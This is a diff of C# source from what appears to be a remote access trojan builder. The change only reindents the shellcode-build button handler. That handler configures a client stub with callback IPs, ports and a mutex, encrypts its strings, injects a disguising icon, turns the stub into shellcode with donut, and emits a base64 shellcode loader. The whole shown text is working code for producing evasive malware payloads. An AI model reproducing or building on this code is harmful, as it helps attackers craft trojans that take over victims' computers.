@@ -314,92 +314,92 @@ namespace Server.Forms
 
         private void btnShellcode_Click(object sender, EventArgs e)
         {
-            
-                if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
-                if (checkBox1.Checked)
-                {
-                    if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
-                    if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
-                }
-                if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();
-                if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;
-                ModuleDefMD asmDef = null;
-                try
-                {
-                    using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
-                    {
-                        string Temppath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe");
-                        if (File.Exists(Temppath))
-                        {
-                            File.Delete(Temppath);
-                        }
 
-                        File.Copy(Path.Combine(Application.StartupPath, @"Stub\Client.exe"), Temppath);
-                        btnShellcode.Enabled = false;
-                        btnBuild.Enabled = false;
-                        WriteSettings(asmDef, Temppath);
+            if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
+            if (checkBox1.Checked)
+            {
+                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
+                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
+            }
+            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();
+            if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;
+            ModuleDefMD asmDef = null;
+            try
+            {
+                using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
+                {
+                    string Temppath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe");
+                    if (File.Exists(Temppath))
+                    {
+                        File.Delete(Temppath);
+                    }
+
+                    File.Copy(Path.Combine(Application.StartupPath, @"Stub\Client.exe"), Temppath);
+                    btnShellcode.Enabled = false;
+                    btnBuild.Enabled = false;
+                    WriteSettings(asmDef, Temppath);
                     if (chkObfu.Checked)
                     {
                         EncryptString.DoEncrypt(asmDef);
 
                     }
                     asmDef.Write(Temppath);
-                        asmDef.Dispose();
-                        if (btnAssembly.Checked)
-                        {
-                            WriteAssembly(Temppath);
-                        }
-                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
-                        {
-                            IconInjector.InjectIcon(Temppath, txtIcon.Text);
-                        }
-                        string savepath = "";
-                        using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
-                        {
-                            saveFileDialog1.Filter = ".bin (*.bin)|*.bin";
-                            saveFileDialog1.InitialDirectory = Application.StartupPath;
-                            saveFileDialog1.OverwritePrompt = false;
-                            saveFileDialog1.FileName = "Client";
-                            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                            {
-                                savepath = saveFileDialog1.FileName;
-                            }
-                        }
-                        string Donutpath = Path.Combine(Application.StartupPath, @"Plugins\donut.exe");
-                        if (!File.Exists(Donutpath))
-                        {
-                            File.WriteAllBytes(Donutpath, Properties.Resources.donut);
-                        }
-                        Process Process = new Process();
-                        Process.StartInfo.FileName = Donutpath;
-                        Process.StartInfo.CreateNoWindow = true;
-                        Process.StartInfo.Arguments = "-f " + Temppath + " -o " + savepath;
-                        Process.Start();
-                        Process.WaitForExit();
-                        Process.Close();
-                        if (File.Exists(savepath))
-                        {
-                            File.WriteAllText(savepath + "loader.cs", Properties.Resources.ShellcodeLoader.Replace("%Nein%", Convert.ToBase64String(File.ReadAllBytes(savepath))));
-                            File.WriteAllText(savepath + ".b64", Convert.ToBase64String(File.ReadAllBytes(savepath)));
-                        }
-                        File.Delete(Temppath);
-                        File.Delete(Donutpath);
-                        MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        SaveSettings();
-                        this.Close();
+                    asmDef.Dispose();
+                    if (btnAssembly.Checked)
+                    {
+                        WriteAssembly(Temppath);
                     }
+                    if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
+                    {
+                        IconInjector.InjectIcon(Temppath, txtIcon.Text);
+                    }
+                    string savepath = "";
+                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
+                    {
+                        saveFileDialog1.Filter = ".bin (*.bin)|*.bin";
+                        saveFileDialog1.InitialDirectory = Application.StartupPath;
+                        saveFileDialog1.OverwritePrompt = false;
+                        saveFileDialog1.FileName = "Client";
+                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
+                        {
+                            savepath = saveFileDialog1.FileName;
+                        }
+                    }
+                    string Donutpath = Path.Combine(Application.StartupPath, @"Plugins\donut.exe");
+                    if (!File.Exists(Donutpath))
+                    {
+                        File.WriteAllBytes(Donutpath, Properties.Resources.donut);
+                    }
+                    Process Process = new Process();
+                    Process.StartInfo.FileName = Donutpath;
+                    Process.StartInfo.CreateNoWindow = true;
+                    Process.StartInfo.Arguments = "-f " + Temppath + " -o " + savepath;
+                    Process.Start();
+                    Process.WaitForExit();
+                    Process.Close();
+                    if (File.Exists(savepath))
+                    {
+                        File.WriteAllText(savepath + "loader.cs", Properties.Resources.ShellcodeLoader.Replace("%Nein%", Convert.ToBase64String(File.ReadAllBytes(savepath))));
+                        File.WriteAllText(savepath + ".b64", Convert.ToBase64String(File.ReadAllBytes(savepath)));
+                    }
+                    File.Delete(Temppath);
+                    File.Delete(Donutpath);
+                    MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    SaveSettings();
+                    this.Close();
                 }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    asmDef?.Dispose();
-                    btnBuild.Enabled = true;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                asmDef?.Dispose();
+                btnBuild.Enabled = true;
 
-                }
-            
+            }
+
         }
 
-   
+
 
         private void btnBuild_Click(object sender, EventArgs e)
         {
